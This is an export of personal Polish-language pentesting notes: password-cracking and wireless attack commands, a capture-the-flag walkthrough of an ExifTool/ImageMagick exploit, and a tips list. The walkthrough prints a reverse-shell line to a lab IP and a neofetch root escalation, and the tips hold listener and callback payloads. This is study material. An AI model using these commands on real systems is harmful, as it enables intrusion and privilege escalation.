<h3 id="password-cracking">Password Cracking</h3>
<p><strong>John-the-ripper</strong> modes: single crack, wordlist, incremental</p>
<div><pre class="hljs"><code>
$ john crack.passwd.db		<span class="hljs-comment"># basic use	</span>
$ john --worldlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/john/</span>password.lst --format=crypt --rules crack.passwd.sb
<span class="hljs-comment"># --worldlist=/usr/share/john/password.lst 	-wordlista</span>
<span class="hljs-comment"># --format=crypt 	-hash format</span>
<span class="hljs-comment"># --rules 	-mieszanie haseł robiąć z nich subzbiory, zwiększa różnorodność haseł </span>
<span class="hljs-comment"># crack.passwd.sb</span></code></pre></div>
<p><strong>Hashcat</strong></p>
<div><pre class="hljs"><code><span class="hljs-meta">$ </span><span class="language-bash">hashcat --<span class="hljs-built_in">help</span></span>
<span class="hljs-meta">$ </span><span class="language-bash">hashcat -m 500 example500.hash /usr/share/john/password.lst</span> 
<span class="hljs-meta"># </span><span class="language-bash">-m 500	-<span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> (500=md5)</span>
<span class="hljs-meta"># </span><span class="language-bash">example500.hash 	-plik zawierający <span class="hljs-built_in">hash</span> hasła <span class="hljs-keyword">do</span> rozszyfrowania</span>
<span class="hljs-meta"># </span><span class="language-bash">/usr/share/john/password.lst	-word list</span></code></pre></div>
<p><strong>ophcrack</strong>: Rainbow tables</p>
<div><pre class="hljs"><code>ophcrack -g -d /<span class="hljs-type">path</span>/<span class="hljs-keyword">to</span>/<span class="hljs-keyword">tables</span> -t xp_free_fast,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>:vista_free -f hash.txt
-g -<span class="hljs-keyword">disable</span> gui
-d /<span class="hljs-type">path</span>/<span class="hljs-keyword">to</span>/<span class="hljs-keyword">tables</span>	-base <span class="hljs-type">path</span> <span class="hljs-keyword">to</span> rainbow <span class="hljs-keyword">tables</span> 
-t xp_free_fast,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>:vista_free -specify <span class="hljs-keyword">tables</span> <span class="hljs-keyword">to</span> use
-f hash.txt	-file containing hashes <span class="hljs-keyword">to</span> be cracked</code></pre></div>
<p><strong>Cain and Abel</strong> (windows, nie suportowany)</p>
<h3 id="kerberoasting">Kerberoasting</h3>
<p>service account attacks
credsy są skradzione z pamięci, crackowane offline, …
programy: <strong>powersploit, empire</strong>, automatyzują</p>
<h2 id="attacking-wireless-networks">Attacking wireless networks</h2>
<p>Against Confidentiality: Evil twin, Bluesnarfing
Against Integrity: WPS PIN attack, RFID cloning,
Against Availability: Jamming, Deauthentication attack
<strong>programy</strong>: Air-crack-ng (<a title="https://www.aircrack-ng.org" href="https://www.aircrack-ng.org">https://www.aircrack-ng.org</a>), Kismet (<a title="https://www.kismetwireless.net" href="https://www.kismetwireless.net">https://www.kismetwireless.net</a>)(bt, sdr i inne wyspecjalizowane urządzenia), Wifite2 (<a title="https://github.com/derv82/wifite2" href="https://github.com/derv82/wifite2">https://github.com/derv82/wifite2</a>)</p>
<h3 id="aircrack-ng-suite">aircrack-ng suite</h3>
<p>airmon-ng -enable monitor mode on wireless interface, itd
aireplay-ng -inject frames,
aircrack-ng -szuka kluczy w przechwyconych pakietach,
airodump-ng -capture frames, może logować położenie GPS sieci jeśli jest dodatkowe urządzenie jest dołączone</p>
<div><pre class="hljs"><code>$ iwconfig <span class="hljs-comment">#list and identify local wireless network interface device </span>
$ airmon-ng<span class="hljs-built_in"> check </span>wlan0 <span class="hljs-comment">#czy są jakies procesy które mogą interferować z pracą aircrack-ng suite </span>
$ airmon-ng<span class="hljs-built_in"> check </span>kill <span class="hljs-comment">#ubij procesy przeszkadzające</span>
$ airmon-ng start wlan0 <span class="hljs-comment">#przełącz interfejs w tryb MONITOR</span>
$ iwconfig <span class="hljs-comment"># sprawdzeie czy interfejs przeszedł w tryb monitor i ma nową nazwę</span>
$ airodump-ng wlan0mon <span class="hljs-comment">#dump pakietów z ze skonfigurowanego interfejsu</span></code></pre></div>
<h3 id="scapy">SCAPY</h3>
<p><strong>mocne, zainteresować się</strong>
is a Python library and standalone program that enables users to send, sniff, dissect, and forge network packets. It can be installed using pip or the relevant package manager for your platform. We can scan, traceroute, probe, attack, and discover networks using Scapy. Imagine replacing hping, arpspoof, arping, tcpdump, tshark, p0f, and most of nmap with just one program.</p>
<h3 id="ataki-evil-twin-i-captive-portal">Ataki Evil Twin i Captive Portal</h3>
<p><strong>Evil Twin</strong> tworzony jest fałszywy Acces Point z takim samym SSID jak prawdziwy, atakujący rozpoczyna deautentykację (atak polegający na ) użytkownika podłączonego do prawdziwego AP, rozgłaszając ramkę deauth do użytkownika, zmuszając go do odłączenia się od prawdziwego punktu dostępowego. podszywające się pod AP urządzenie jest wtedy albo fizycznie zlokalizowany bliżej użytkownika niż prawdziwy AP, albo nadaje swój sygnał z większą siłą niż prawdziwy AP. Urządzenie użytkownika albo automatycznie połączy się ze złym bliźniakiem, ponieważ ma znany identyfikator SSID, albo po odłączeniu od legalnego punktu dostępu użytkownik uzyska dostęp do listy dostępnych punktów dostępu i połączy się ze znajomym identyfikatorem SSID. Może to następnie skłonić użytkownika do uwierzytelnienia, w którym to momencie atakujący może ukraść hasło do prawdziwego AP, umożliwiając atakującemu bezpośrednie połączenie z prawdziwym AP.
BSSID -adres MAC AP
ESSID -network name, user identify network</p>
<p>One common tactic that follows on from an evil twin attack is to present the user with a captive portal. A captive portal is a web page to which a client is redirected when they connect to a guest SSID. The client can gain access to the internet after they successfully authenticate or accept the terms of use on the portal page. Captive portals will be familiar to anyone that uses Wi‑Fi offered in public places, including hotels, transport hubs, and coffee shops. If we can trick the user into thinking that they need to reauthenticate after momentarily being disconnected from the network, we can capture those credentials and use them to gain access to the target network.</p>
<h3 id="pixie-dust-attack">Pixie Dust Attack</h3>
<h3 id="bluetooth-attacks">Bluetooth Attacks</h3>
<p><strong>Bluejacking</strong> involves sending unsolicited messages over Bluetooth to other Bluetooth‑enabled devices. It’s essentially a form of spam. It requires a target device to have Bluetooth enabled and to be discoverable. No harm in so far as the attacker gains no control over the device and can’t access any sensitive information, but it’s considered an attack against integrity because it abuses the trust relationship between the two devices. programy: BlueSpam, Freejack and eJack
<strong>Bluesnarfing</strong> is the theft of information from Bluetooth‑enabled devices. It relies on exploiting a vulnerability in the object exchange, or OBEX, protocol. OBEX enables the exchange of data between connected devices, but most of its subservices don’t require any authentication to validate the device sending or receiving the data. The original developers of Bluetooth technology consciously implemented the OBEX protocol without authentication policies in place like asking for a PIN or a paring request in order to ease the sharing of digital business cards. Kali includes the <strong>Bluesnarfer</strong> package, which allows phonebook contact theft via Bluetooth given a device ID or address, and <strong>Bluediving</strong>, which implements several attacks, including BlueBug, BlueSnarf, BlueSnarf++, and BlueSmack. Unless the hacker has specialized equipment, they must be within 30 ft or 10 m of the victim’s phone for the attack to succeed. Bluesniping is a type of Bluesnarfing in which the hacker uses equipment to increase the range of the paired phone, allowing it to attack devices that are located farther away than the standard Bluetooth range.
inne ataki: <strong>Bluebugging</strong>, <strong>CarWhispere</strong> (podatność w sytemach bt aut), <strong>BlueBorne</strong> (ifect with malware),</p>
<h3 id="rfid-cloning">RFID Cloning</h3>
<h2 id="application-attacks">Application attacks</h2>
<h3 id="server-side-request-forgery">Server-side Request Forgery</h3>
<h2 id="attacks-against-cloud-technologies">Attacks against cloud technologies</h2>
<h2 id="attacking-and-exploiting-specialized-systems">Attacking and exploiting specialized systems</h2>
<h2 id="social-engineering-and-physical-attacks">Social engineering and physical attacks</h2>
<h2 id="post-exploitation">Post-exploitation</h2>
<h1 id="5-post-exploitation">5. Post Exploitation</h1>
<h1 id="6-reporting">6. Reporting</h1>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[joplin notes webpage using github]]></title>
            <guid>2c95478a8c86452bbe754826ea021a96</guid>
            <pubDate>Thu, 21 Jul 2022 12:20:12 GMT</pubDate>
            <content:encoded><![CDATA[<a title="https://www.reddit.com/r/joplinapp/comments/o8jddb/is_it_possible_to_turn_parts_of_a_joplin_into_a/" href="https://www.reddit.com/r/joplinapp/comments/o8jddb/is_it_possible_to_turn_parts_of_a_joplin_into_a/">https://www.reddit.com/r/joplinapp/comments/o8jddb/is_it_possible_to_turn_parts_of_a_joplin_into_a/</a>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[anbox]]></title>
            <guid>31d0405cc113472eaad0083306e8dfe3</guid>
            <pubDate>Wed, 15 Jun 2022 09:03:01 GMT</pubDate>
            <content:encoded><![CDATA[<p>install anbox on debian
<a title="https://dev.to/sbellone/how-to-install-anbox-on-debian-1hjd?fbclid=IwAR1DG8y8-kGWBhlg_sM3B5MRoftd72p2imn5lp3kH7OTAYb3LapmZCdkE0c" href="https://dev.to/sbellone/how-to-install-anbox-on-debian-1hjd?fbclid=IwAR1DG8y8-kGWBhlg_sM3B5MRoftd72p2imn5lp3kH7OTAYb3LapmZCdkE0c">https://dev.to/sbellone/how-to-install-anbox-on-debian-1hjd?fbclid=IwAR1DG8y8-kGWBhlg_sM3B5MRoftd72p2imn5lp3kH7OTAYb3LapmZCdkE0c</a>
a jakby nie chcaiło działać to jeszcze to
<a title="https://forum.manjaro.org/t/how-to-install-anbox-on-manjaro/2636/92?u=raiyani87" href="https://forum.manjaro.org/t/how-to-install-anbox-on-manjaro/2636/92?u=raiyani87">https://forum.manjaro.org/t/how-to-install-anbox-on-manjaro/2636/92?u=raiyani87</a></p>
<hr />
<p>ustawienie proxy na anbox
adb shell settings put global http_proxy 10.10.14.17:45678</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[META]]></title>
            <guid>6f297eb6b809478c935db8ae61927128</guid>
            <pubDate>Thu, 09 Jun 2022 12:22:54 GMT</pubDate>
            <content:encoded><![CDATA[<p><img src="/_resources/afa894a59e454eada6e862980a89c1f3.png" />
<img src="/_resources/aab9926b9f2441729b8429e3eb7831d7.png" />
<img src="/_resources/d4a437353ec24a219202bc7757ac06c2.png" />
<img src="/_resources/90f554bcae1a4366b20625ddd1e24039.png" />
<img src="/_resources/987606ff2e5f4833908c5c2b43c22810.png" />
<img src="/_resources/3cdb923148204e68926aa1a08e716147.png" />
<img src="/_resources/782ea4f430714f558e3ffb665aa0128c.png" />
<img src="/_resources/5978899c3b2240558f3fb9d8217fbc9b.png" />
omówienie CVE	
<a title="https://blog.convisoappsec.com/en/a-cae-study-on-cve-2021-22204-exiftool-rce/" href="https://blog.convisoappsec.com/en/a-cae-study-on-cve-2021-22204-exiftool-rce/">https://blog.convisoappsec.com/en/a-cae-study-on-cve-2021-22204-exiftool-rce/</a>
tworzy obraz z payloadem i pozwala uzyskać reverse shell do usera www-data
<a title="https://github.com/convisolabs/CVE-2021-22204-exiftool" href="https://github.com/convisolabs/CVE-2021-22204-exiftool">https://github.com/convisolabs/CVE-2021-22204-exiftool</a>
<img src="/_resources/9bffe8329f7348208f874f1f7a7be75f.png" /></p>
<p>przechwycone procesy za pomocą programu pspy64
<img src="/_resources/743e413147e54b3680997648881dd554.png" />
przeszukano pliki i pojawił się w skrypcie, który uruchamia program morgrify, skrypt wykonuje się z uprawnieniami użytkownika thomas
<img src="/_resources/97c48bf146f04a4b980bdf417f9a1641.png" /></p>
<p>skrypt wykonuje program mogrify z pakietu ImageMagic
<img src="/_resources/1d887f758a9c4d1e992fa86a97ca93bf.png" />
wykorzystana metoda ataku z użyciem ImageMagic pozwala na wstrzyknięcie kodu do pliku, umieszczeniu spreparowanego pliku w katalogu /var/www/dev01.artcorp.htb/converted_images/, zaczekanie na wykonanie operacji na pliku poprzez skrypt
<a title="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html" href="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html">https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html</a>
plik z kodem
<img src="/_resources/ac31a60bbeff4efebb824e2592dc43a5.png" />
polecenia powłoki (bash -i &gt;&amp; /dev/tcp/10.10.14.21/11111 0&gt;&amp;1) zostały zakodowane przy pomocy base64
udało uzyskać się reverse shell oraz zdobyć klucz prywatny rsa
<img src="/_resources/4a7e308daf154437aea5008aaa1d1759.png" />
<img src="/_resources/6a561ff07c5149238c72cedf152ea5d7.png" />
Użytkownik thomas ma prawo używać programu neofetch z uprawnieniami roota bez podawania hasła oraz zostaje zachowana zmienna środowiskowa XDG_CONFIG_HOME. Neofetch wykorzystuje tą zmienną w celu załadowani pliku konfiguracyjnego znajdującego się, w przypadku thomasa, w ~/.config/neofetch/config.conf .</p>
<p><em>$XDG_CONFIG_HOME defines the base directory relative to which user specific configuration files should be stored. If $XDG_CONFIG_HOME is either not set or empty, a default equal to $HOME /. config should be used.</em></p>
<p>Wcelu uzyskania uprawnień roota plik konfiguracyjny użytkownika thomas należy zmienić poprzez komendę: <em>echo ‘exec /bin/sh’ &gt; .config/neofetch/config.conf</em>, exportować wartość zmiennej XDG_CONFIG_HOME tak aby ścierzka prowadziła do folderu z plikami konfiguracyjnymi użytkownika thomas oraz uruchomić program neofetch z uprawnieniami roota
<img src="/_resources/af5ec1c7a0c34cc9ac50a24549d75122.png" /></p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[TRICKI]]></title>
            <guid>1f25a0ad6a0f43c992d1662a72e19874</guid>
            <pubDate>Fri, 27 May 2022 12:46:27 GMT</pubDate>
            <content:encoded><![CDATA[<h1 id="super-notatki">SUPER NOTATKI</h1>
<h1 id="https0xffseccomhandbook"><a title="https://0xffsec.com/handbook/" href="https://0xffsec.com/handbook/">https://0xffsec.com/handbook/</a></h1>
<h1 id="exploity-na-binarkach-unix">exploity na binarkach unix</h1>
<p><a title="https://gtfobins.github.io/" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
<h1 id="ręczne-hakowanie-stron-internetowych">Ręczne hakowanie stron internetowych</h1>
<ul>
<li>czy ktoś obserwuje jakiś formularz i kliknie, czy obraz będzie pobierany?
ustawić listener na porcie 80: nc -lvp 80
<ul>
<li>&lt; img src=“http://IP_MOJEGO_SERWERA:PORT/test”&gt; &lt;/ img&gt;</li>
<li>&lt; img src=“http://IP_MOJEGO_SERWERA:PORT/test”&gt; &lt;/ img&gt;</li>
</ul>
</li>
<li>Czy to serwer PHP?
<ul>
<li><a title="http://adres/" href="http://adres/">http://adres/</a><strong>index.php</strong></li>
</ul>
</li>
<li>Jeśli to serwer ww to sprawdzić co jest na nim postawione
<ul>
<li>cd /var/www -zawiera foldey domenowe zawierające pliki dla każdej z hostowanych stron (DOMENY)
<ul>
<li>folder root dla strony to /var/www/&lt;nazwa_domeny&gt;/public_html, zawiera index.html (str główna), root jest deklarowany w pliku <em>conf</em> w folderze * /etc/apache2/sites-available*</li>
</ul>
</li>
<li>/etc/apache2/sites-available -zawiera pliki konfiguracyjne vhost (każdy to inna DOMENA)</li>
<li>/etc/apache2/sites-enabled -włączone (widoczne, możliwe do wyświetlenia) strony, symbolic link do jakiegoś pliku z folderu <em>sites-available</em></li>
<li>źródło: <a title="https://linuxize.com/post/how-to-set-up-apache-virtual-hosts-on-ubuntu-20-04/#creating-a-virtual-hosts" href="https://linuxize.com/post/how-to-set-up-apache-virtual-hosts-on-ubuntu-20-04/#creating-a-virtual-hosts">https://linuxize.com/post/how-to-set-up-apache-virtual-hosts-on-ubuntu-20-04/#creating-a-virtual-hosts</a></li>
</ul>
</li>
</ul>
<p>Subdomena nie musi kierować do tego samego serwera, jest to sposób na zapewnienie użytkownikowi spójnego nazewnictwa, np.: ftp.nazwa.com, mail.nazwa.com mogą prowadzić do różnych serwerów, np.:
www.nazwa.com -normal web site
hr.nazwa.com -portal dla hr</p>
<h1 id="lista-użytecznych-payloadów-i-innych-do-atakowania-stron-internetowych">Lista użytecznych payloadów i innych do atakowania stron internetowych</h1>
<p><a title="https://github.com/swisskyrepo/PayloadsAllTheThings" href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a></p>
<h1 id="pspy">pspy</h1>
<p>podglądaj procesy nawet jako zwykły user
pobrać, wysłać na atakowany komputer, chmod +x, ./pspy
<a title="https://github.com/DominicBreuker/pspy" href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p>
<h1 id="linpeassh">linpeas.sh</h1>
<p><a title="https://github.com/carlospolop/PEASS-ng/releases/tag/20220522" href="https://github.com/carlospolop/PEASS-ng/releases/tag/20220522">https://github.com/carlospolop/PEASS-ng/releases/tag/20220522</a></p>
<h1 id="easy-reverseshel">easy reverseshel</h1>
<p><a title="https://github.com/lukechilds/reverse-shell" href="https://github.com/lukechilds/reverse-shell">https://github.com/lukechilds/reverse-shell</a></p>
<h1 id="reverse-shell-cheat-sheet">reverse shell cheat sheet</h1>
<p><a title="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md</a></p>
<h1 id="seclist">seclist</h1>
<p><a title="https://github.com/danielmiessler/SecLists" href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a>
zbiór wielu typów list wykorzystywanych podczas oceny bezpieczeństwa, zgromadzone w jednym miejscu
<a title="https://www.kali.org/tools/seclists/" href="https://www.kali.org/tools/seclists/">https://www.kali.org/tools/seclists/</a></p>
<h1 id="wyszykiwanie-linków-na-stronie">wyszykiwanie linków na stronie</h1>
<div><pre class="hljs"><code>curl http://link/ --silent | <span class="hljs-type">grep</span> -Eo <span class="hljs-string">"href=\"[^\"]*\""</span> | <span class="hljs-type">sort</span> | <span class="hljs-type">uniq</span>
curl --silent http://link | <span class="hljs-type">grep</span> -Eo <span class="hljs-string">"[a-zA-Z]*=\"[^\"]*\""</span> | <span class="hljs-type">sort</span> | <span class="hljs-type">uniq</span></code></pre></div>
<h1 id="python">PYTHON</h1>
<div><pre class="hljs"><code><span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.join(<span class="hljs-built_in">os</span>.getcwd(), <span class="hljs-string">"public"</span>, <span class="hljs-string">"uploads"</span>, el)</code></pre></div>
<p>If a component (el) is an absolute path (np.: (//?) /daniel), all previous components are thrown away and joining continues from the absolute path component.</p>
<h1 id="nikto">nikto</h1>
<p>Scan web server for known vulnerabilities</p>
<div><pre class="hljs"><code>nikto -host http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">2.47</span>/dvwa</code></pre></div>
<p>analizuje aplikację- adres pod kątem możliwych wektorów ataku</p>
<h1 id="malicious-code-in-image">malicious code in image</h1>
<p><a title="https://rcenetsec.com/hide-malicious-shell-in-image-file/" href="https://rcenetsec.com/hide-malicious-shell-in-image-file/">https://rcenetsec.com/hide-malicious-shell-in-image-file/</a></p>
<h1 id="spawn-a-tty-shell">spawn a TTY Shell</h1>
<p>różne metody spawnu powłoki (nie tylko python)
<a title="https://netsec.ws/?p=337" href="https://netsec.ws/?p=337">https://netsec.ws/?p=337</a>
pełen upgrade
<a title="https://null-byte.wonderhowto.com/how-to/upgrade-dumb-shell-fully-interactive-shell-for-more-flexibility-0197224/" href="https://null-byte.wonderhowto.com/how-to/upgrade-dumb-shell-fully-interactive-shell-for-more-flexibility-0197224/">https://null-byte.wonderhowto.com/how-to/upgrade-dumb-shell-fully-interactive-shell-for-more-flexibility-0197224/</a></p>
<div><pre class="hljs"><code>python3 -c <span class="hljs-symbol">'import</span> pty; pty.spawn(<span class="hljs-string">"/bin/bash"</span>)'</code></pre></div>
<p><em>CTRL-Z</em></p>
<div><pre class="hljs"><code><span class="hljs-built_in">echo</span> <span class="hljs-variable">$TERM</span>		-own terminal info, zapisać jaki terminal
stty -a		 	-own terminal info, zapisać ilość kolumn i wierszy
stty raw -<span class="hljs-built_in">echo</span> &amp;&amp; <span class="hljs-built_in">fg</span>	-allow to pass keyboard shortcuts through</code></pre></div>
<p><em>ENTER</em></p>
<div><pre class="hljs"><code>reset
<span class="hljs-built_in">export</span> <span class="hljs-attribute">TERM</span>=xterm	-albo inny, wcześniej zapisany
<span class="hljs-built_in">export</span> <span class="hljs-attribute">SHELL</span>=bash	-ustawienie powłoki
stty rows 26 cols 105	-ustawienie kolumn i wierszy, wcześniej zapisanych</code></pre></div>
<h1 id="czytanie-wszystkich-plików-w-poszukiwaniau-wyrażenia">czytanie wszystkich plików w poszukiwaniau wyrażenia</h1>
<div><pre class="hljs"><code><span class="hljs-keyword">grep</span> -R wyrażenie <span class="hljs-regexp">/ 2&gt; /</span>dev/<span class="hljs-keyword">null</span></code></pre></div>
<p>-R rekursywnie
/ root folder</p>
<h1 id="ustawienie-wartości-jakiejś-zmiennej-dla-procesukomendy">ustawienie wartości jakiejś zmiennej dla procesu/komendy</h1>
<p><a title="https://stackoverflow.com/questions/10856129/setting-an-environment-variable-before-a-command-in-bash-is-not-working-for-the/10856348#10856348" href="https://stackoverflow.com/questions/10856129/setting-an-environment-variable-before-a-command-in-bash-is-not-working-for-the/10856348#10856348">https://stackoverflow.com/questions/10856129/setting-an-environment-variable-before-a-command-in-bash-is-not-working-for-the/10856348#10856348</a>
export FOO=bar
somecommand someargs</p>
<p><a title="https://unix.stackexchange.com/questions/126938/why-is-setting-a-variable-before-a-command-legal-in-bash" href="https://unix.stackexchange.com/questions/126938/why-is-setting-a-variable-before-a-command-legal-in-bash">https://unix.stackexchange.com/questions/126938/why-is-setting-a-variable-before-a-command-legal-in-bash</a>
FOO=bar somecommand someargs</p>
<h2 id="dla-kilku-komend">dla kilku komend</h2>
<p>FOO=bar bash -c ‘somecommand someargs | somecommand2’
używając sudo należy pamięctać o -E aby przekazywało zmienne do dalszych poleceń</p>
<h1 id="przejęcie-shella-bez-zmiany-pid">przejęcie shella bez zmiany PID</h1>
<div><pre class="hljs"><code>exec <span class="hljs-regexp">/bin/</span>sh</code></pre></div>
<h1 id="usuń-puste-foldery">usuń puste foldery</h1>
<div><pre class="hljs"><code><span class="hljs-keyword">find</span> . -<span class="hljs-built_in">type</span> d -<span class="hljs-built_in">empty</span> -<span class="hljs-keyword">delete</span></code></pre></div>
<h1 id="przenieś-wszytkie-pliki-z-danym-rozszerzeniem-do-jednego-folderu">przenieś wszytkie pliki z danym rozszerzeniem do jednego folderu</h1>
<div><pre class="hljs"><code><span class="hljs-built_in">find</span> . -<span class="hljs-built_in">name</span> <span class="hljs-string">"*.zip"</span> -<span class="hljs-built_in">exec</span> mv <span class="hljs-string">"{}"</span> ./zipfiles \;</code></pre></div>
<h1 id="znajdź-duplikaty-plików-używając-md5">znajdź duplikaty plików używając md5</h1>
<div><pre class="hljs"><code><span class="hljs-built_in">find</span> . -<span class="hljs-built_in">type</span> f -print0 | xargs <span class="hljs-number">-0</span> md5sum | <span class="hljs-built_in">sort</span> | uniq -w32 <span class="hljs-comment">--all-repeated=separate</span></code></pre></div>
<h1 id="zamień-spacje-z-nazw-plików-na-_-nie-rekurencyjne-pliki-i-foldery">zamień spacje z nazw plików na _ (nie rekurencyjne, pliki i foldery)</h1>
<div><pre class="hljs"><code><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> *\ *; <span class="hljs-keyword">do</span> mv <span class="hljs-string">"<span class="hljs-variable">$f</span>"</span> <span class="hljs-string">"<span class="hljs-variable">${f// /_}</span>"</span>; <span class="hljs-keyword">done</span></code></pre></div>
<p>The ${f// /_} part utilizes bash’s parameter expansion mechanism to replace a pattern within a parameter with supplied string. The relevant syntax is ${parameter/pattern/string}. See: <a title="https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html" href="https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html">https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html</a> or <a title="http://wiki.bash-hackers.org/syntax/pe" href="http://wiki.bash-hackers.org/syntax/pe">http://wiki.bash-hackers.org/syntax/pe</a> .</p>
<h1 id="cała-bezwzględna-ścieżka-do-pliku">cała (bezwzględna) ścieżka do pliku</h1>
<div><pre class="hljs"><code><span class="hljs-built_in">find</span> <span class="hljs-string">"<span class="hljs-variable">$(pwd)</span>"</span> -type f</code></pre></div>
<h1 id="ocr">OCR</h1>
<p>ważna jest dobra jakość tekstu na obrazkach
<a title="https://ocrmypdf.readthedocs.io/en/latest/cookbook.html" href="https://ocrmypdf.readthedocs.io/en/latest/cookbook.html">https://ocrmypdf.readthedocs.io/en/latest/cookbook.html</a></p>
<div><pre class="hljs"><code><span class="hljs-comment"># OCR obrazków, tekst do pliku  </span>
<span class="hljs-variable">$ </span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> * ; <span class="hljs-keyword">do</span> tesseract <span class="hljs-variable">$i</span> outtext_<span class="hljs-variable">$1</span>;  done;
<span class="hljs-comment"># OCR PDF</span>
<span class="hljs-variable">$ </span>ocrmypdf --<span class="hljs-keyword">redo</span>-ocr scalone_ocr.pdf scalone_ocr.pdf
<span class="hljs-comment"># wszystkie pliki w folderze to tylko pdfy</span>
<span class="hljs-variable">$ </span><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> *;<span class="hljs-keyword">do</span> ocrmypdf --<span class="hljs-keyword">redo</span>-ocr <span class="hljs-variable">$f</span> <span class="hljs-variable">$f</span>;done </code></pre></div>
<h1 id="pdf">PDF</h1>
<p>scalanie pdf</p>
<div><pre class="hljs"><code>pdfunite pdf1<span class="hljs-selector-class">.pdf</span> pdf2<span class="hljs-selector-class">.pdf</span> ... nazwa_wynikowego_pdf.pdf</code></pre></div>
<h1 id="osint-framework">OSINT framework</h1>
<p>zbiór narzędzi i źródeł danych przydatnych w śledztwach białego wywiadu
<a title="https://osintframework.com/" href="https://osintframework.com/">https://osintframework.com/</a>
<a title="https://osintframework.pl/" href="https://osintframework.pl/">https://osintframework.pl/</a>	-rozszerza o polskę</p>
<h1 id="shodan">shodan</h1>
<p>port:21 -otwarte porty = 21 (ftp), 5000
nasa.gov -pokaż servery związane z NASA
product: apache</p>
<h1 id="recon-ng">recon-ng</h1>
<p>full-featured reconnaissance framework designed with the goal of providing a powerful environment to conduct open source web-based reconnaissance quickly and thoroughly
<a title="https://github.com/lanmaster53/recon-ng/wiki" href="https://github.com/lanmaster53/recon-ng/wiki">https://github.com/lanmaster53/recon-ng/wiki</a>
<a title="https://www.kali.org/tools/recon-ng/" href="https://www.kali.org/tools/recon-ng/">https://www.kali.org/tools/recon-ng/</a></p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[BASH]]></title>
            <guid>0fc90b4ef65a48e7ab8601c3bfb2e243</guid>
            <pubDate>Fri, 27 May 2022 12:26:35 GMT</pubDate>
            <content:encoded><![CDATA[<pre><code># BASH
</code></pre>
<h2 id="zmienne">ZMIENNE</h2>
<p>name=variable (bez spacji)
$variable zastępuje zmienną jej wartością
user=$(whoami) -command substitution
$0 -nazwa skruptu
$1-9 -9 argunemtów przekazanych do skryptu
$@ -wszystkie argumenty przekazane do skryptu
$? -exit status ostatniego skryptu (0 true, 1 false)</p>
<div><pre class="hljs"><code>* <span class="hljs-keyword">if</span> [ $? -eq <span class="hljs-number">0</span> ]; <span class="hljs-keyword">then</span>
 <span class="hljs-string">\#</span> <span class="hljs-keyword">do</span> something
<span class="hljs-keyword">else</span>
 <span class="hljs-string">\#</span> <span class="hljs-keyword">do</span> something <span class="hljs-keyword">else</span>
fi</code></pre></div>
<p>$$ -proces ID skryptu
$USER -username uruchamiającego skrypt
$HOSTNAME -hostname maszyny uruchamiającej skrypt</p>
<p>read answear -przypisane odpowiedzi usera (w CLI) do zmiennej answear
-p -prompt, wyświetl napis zachęty
-s -silent, nie widać co jest wpisywane</p>
<div><pre class="hljs"><code><span class="hljs-built_in">read</span> -p <span class="hljs-string">"Username: "</span></code></pre></div>
<div><pre class="hljs"><code><span class="hljs-keyword">read</span> -<span class="hljs-keyword">ps</span> <span class="hljs-string">"Password: "</span></code></pre></div>
<hr />
<h2 id="pętle-funkcjie-itd">PĘTLE, FUNKCJIE, ITD.</h2>
<p><strong>IF</strong></p>
<div><pre class="hljs"><code><span class="hljs-keyword">if</span> [<span class="hljs-built_in">test</span>]
    <span class="hljs-keyword">then</span>
        action1
<span class="hljs-keyword">elif</span> [test2]
    <span class="hljs-keyword">then</span>
        action2
<span class="hljs-keyword">else</span>
        action3
<span class="hljs-keyword">fi</span></code></pre></div>
<p><strong>WHILE</strong></p>
<div><pre class="hljs"><code><span class="hljs-keyword">while</span> [<span class="hljs-built_in">test</span>]
<span class="hljs-keyword">do</span>
    action
<span class="hljs-keyword">done</span></code></pre></div>
<p><strong>FOR</strong></p>
<div><pre class="hljs"><code><span class="hljs-keyword">for</span> var_name <span class="hljs-keyword">in</span> list
<span class="hljs-keyword">do</span>
    action
<span class="hljs-keyword">done</span></code></pre></div>
<p><strong>listy</strong>
((c=1; c&lt;=10;c++)) ==  {1…10} =1,2,3,4,5,6,7,8,9,10
z krokiem =&gt; {1…10…2} == 1,3,5,7,9</p>
<div><pre class="hljs"><code><span class="hljs-attribute">echo</span> {<span class="hljs-number">1</span>..<span class="hljs-number">10</span>..<span class="hljs-number">2</span>}</code></pre></div>
<div><pre class="hljs"><code><span class="hljs-keyword">for</span> ((c=1;c&lt;=10;c++));<span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$c</span>; <span class="hljs-keyword">done</span></code></pre></div>
<hr />
<h2 id="ncnetcat">nc/netcat</h2>
<div><pre class="hljs"><code><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">123</span></code></pre></div>
<ul>
